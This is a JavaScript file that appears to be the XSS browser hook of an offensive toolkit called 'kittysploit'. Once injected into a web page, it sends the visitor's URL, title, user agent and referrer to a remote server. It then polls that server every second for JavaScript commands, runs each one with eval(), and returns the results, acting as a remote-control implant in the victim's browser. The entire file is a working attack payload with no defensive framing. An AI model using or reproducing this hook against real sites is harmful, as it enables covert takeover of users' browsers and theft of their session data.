(function() {
    'use strict';
    
    // Detect server host and port from the script's origin
    // This allows the script to work regardless of how it's loaded (localhost, remote IP, domain, etc.)
    function getServerHost() {
        // First, try to get from the script's own URL (if injected via <script src="...">)
        try {
            if (document.currentScript && document.currentScript.src) {
                const scriptUrl = new URL(document.currentScript.src);
                return scriptUrl.hostname;
            }
        } catch (e) {}
        
        // Fallback: try to find the script tag by searching for this script's URL pattern
        try {
            const scripts = document.getElementsByTagName('script');
            for (let i = 0; i < scripts.length; i++) {
                if (scripts[i].src && (scripts[i].src.includes('/inject.js') || scripts[i].src.includes('/xss_injection.js'))) {
                    const scriptUrl = new URL(scripts[i].src);
                    return scriptUrl.hostname;
                }
            }
        } catch (e) {}
        
        // Last resort: use window.location (works if script is on same origin as page)
        if (window.location && window.location.hostname) {
            return window.location.hostname;
        }
        
        // Final fallback
        return 'SERVER_HOST_PLACEHOLDER';
    }
    
    function getServerPort() {
        // First, try to get from the script's own URL
        try {
            if (document.currentScript && document.currentScript.src) {
                const scriptUrl = new URL(document.currentScript.src);
                return scriptUrl.port || (scriptUrl.protocol === 'https:' ? '443' : '80');
            }
        } catch (e) {}
        
        // Fallback: try to find the script tag
        try {
            const scripts = document.getElementsByTagName('script');
            for (let i = 0; i < scripts.length; i++) {
                if (scripts[i].src && (scripts[i].src.includes('/inject.js') || scripts[i].src.includes('/xss_injection.js'))) {
                    const scriptUrl = new URL(scripts[i].src);
                    return scriptUrl.port || (scriptUrl.protocol === 'https:' ? '443' : '80');
                }
            }
        } catch (e) {}
        
        // Last resort: use window.location
        if (window.location && window.location.port) {
            return window.location.port;
        }
        
        // Final fallback
        return 'SERVER_PORT_PLACEHOLDER';
    }
    
    const SERVER_HOST = getServerHost();
    const SERVER_PORT = getServerPort();
    
    let sessionId = null;
    let commandsExecuted = 0;
    let lastActivity = new Date();
    let pollingInterval = null;
    const STORAGE_KEY = 'kittysploit_session_id';
    
    function generateSessionId() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            const r = Math.random() * 16 | 0;
            const v = c == 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }
    
    function getStoredSessionId() {
        try {
            return localStorage.getItem(STORAGE_KEY);
        } catch (e) {
            return null;
        }
    }
    
    function storeSessionId(id) {
        try {
            localStorage.setItem(STORAGE_KEY, id);
        } catch (e) {
        }
    }
    
    function registerWithServer(reuseSessionId = false) {
        if (reuseSessionId) {
            const storedId = getStoredSessionId();
            if (storedId) {
                sessionId = storedId;
            } else {
                sessionId = generateSessionId();
            }
        } else {
            sessionId = generateSessionId();
        }
        
        const browserInfo = {
            url: window.location.href,
            title: document.title,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine,
            referrer: document.referrer,
            domain: window.location.hostname,
            protocol: window.location.protocol,
            requested_session_id: reuseSessionId ? sessionId : null
        };
        
        fetch(`http://${SERVER_HOST}:${SERVER_PORT}/api/register`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(browserInfo)
        })
        .then(response => response.json())
        .then(data => {
            if (data.session_id) {
                sessionId = data.session_id;
                storeSessionId(sessionId);
                startPolling();
            }
        })
        .catch(error => {
            setTimeout(() => registerWithServer(false), 5000);
        });
    }
    
    function startPolling() {
        if (pollingInterval) {
            clearInterval(pollingInterval);
        }
        
        pollingInterval = setInterval(pollForCommands, 1000);
    }
    
    function pollForCommands() {
        if (!sessionId) return;
        
        fetch(`http://${SERVER_HOST}:${SERVER_PORT}/api/session/${sessionId}/commands`, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
            },
            signal: AbortSignal.timeout(5000)
        })
        .then(response => {
            if (response.ok) {
                return response.json();
            } else {
                throw new Error(`HTTP ${response.status}`);
            }
        })
        .then(data => {
            if (data.stop_polling === true || data.status === 'session_not_found') {
                if (pollingInterval) {
                    clearInterval(pollingInterval);
                    pollingInterval = null;
                }
                const oldSessionId = sessionId;
                sessionId = null;
                setTimeout(() => {
                    registerWithServer(true);
                }, 1000); 
                return;
            }
            
            if (data.commands && data.commands.length > 0) {
                data.commands.forEach(command => {
                    executeCommand(command);
                });
            }
        })
        .catch(error => {
        });
    }
    
    function executeCommand(command) {
        try {
            commandsExecuted++;
            lastActivity = new Date();
            
            if (command.type === 'execute_js' && command.code) {
                try {
                    const result = eval(command.code);
                    if (result && typeof result.then === 'function') {
                        result.then(function(res) {
                            sendResponse(command.id, res !== undefined ? res : 'Executed successfully');
                        }).catch(function(err) {
                            sendResponse(command.id, 'Error: ' + (err && err.message ? err.message : String(err)));
                        });
                    } else {
                        sendResponse(command.id, result !== undefined ? result : 'Executed successfully');
                    }
                } catch (error) {
                    sendResponse(command.id, `Error: ${error.message}`);
                }
            }
        } catch (error) {
            if (command && command.id) {
                sendResponse(command.id, `Error: ${error.message}`);
            }
        }
    }
    
    function sendResponse(commandId, result) {
        if (!sessionId || !commandId) return;
        
        const response = {
            session_id: sessionId,
            command_id: commandId,
            result: result,
            timestamp: new Date().toISOString()
        };
        
        fetch(`http://${SERVER_HOST}:${SERVER_PORT}/api/command`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(response)
        })
        .catch(error => {
        });
    }
        window.kittysploit = {
        sessionId: () => sessionId,
        commandsExecuted: () => commandsExecuted,
        lastActivity: () => lastActivity,
        getServerHost: () => SERVER_HOST,
        getServerPort: () => SERVER_PORT,
        stop: () => {
            if (pollingInterval) {
                clearInterval(pollingInterval);
                pollingInterval = null;
            }
        },
        start: () => {
            if (!pollingInterval && sessionId) {
                startPolling();
            }
        }
    };
    
    // Start the injection
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', registerWithServer);
    } else {
        registerWithServer();
    }
    
})();
